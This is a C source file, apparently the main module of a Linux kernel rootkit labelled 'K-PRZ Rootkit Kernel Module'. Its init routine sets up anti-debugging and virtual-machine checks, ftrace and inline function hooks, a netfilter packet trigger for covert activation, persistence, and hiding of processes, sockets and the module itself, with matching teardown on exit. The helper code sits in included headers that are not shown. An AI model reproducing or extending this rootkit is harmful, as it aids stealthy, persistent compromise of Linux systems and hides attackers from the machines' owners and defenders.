#include <linux/module.h>
#include <linux/kernel.h>
#include "ftrace_hook.h"
#include "string_encrypt.h"
#include "hmac_auth.h"
#include "persistence.h"
#include "directory_encrypt.h"
#include "anti_debug.h"
#include "watchdog.h"
#include "inline_hook.h"
#include "netfilter_trigger.h"
#include "process_hiding.h"
#include "module_hiding.h"
#include "socket_hiding.h"

static int __init rootkit_init(void) {
#ifdef ENABLE_STRING_ENCRYPT
    decrypt_all_strings();
#endif
    anti_debug_and_vm_checks();
#ifdef ENABLE_INLINE_HOOK
    setup_inline_hooks();
#endif
    fh_install_hooks();
#ifdef ENABLE_WATCHDOG
    start_watchdog();
#endif
#ifdef ENABLE_TRIGGER
    setup_netfilter_trigger();
#endif
    setup_persistence();
    setup_process_hiding();
    setup_socket_hiding();
    hide_module();
    return 0;
}

static void __exit rootkit_exit(void) {
#ifdef ENABLE_TRIGGER
    cleanup_netfilter_trigger();
#endif
#ifdef ENABLE_WATCHDOG
    stop_watchdog();
#endif
    fh_remove_hooks();
#ifdef ENABLE_INLINE_HOOK
    remove_inline_hooks();
#endif
#ifdef ENABLE_STRING_ENCRYPT
    encrypt_all_strings();
#endif
    cleanup_persistence();
    remove_process_hiding();
    remove_socket_hiding();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan Borakove");
MODULE_DESCRIPTION("K-PRZ Rootkit Kernel Module");
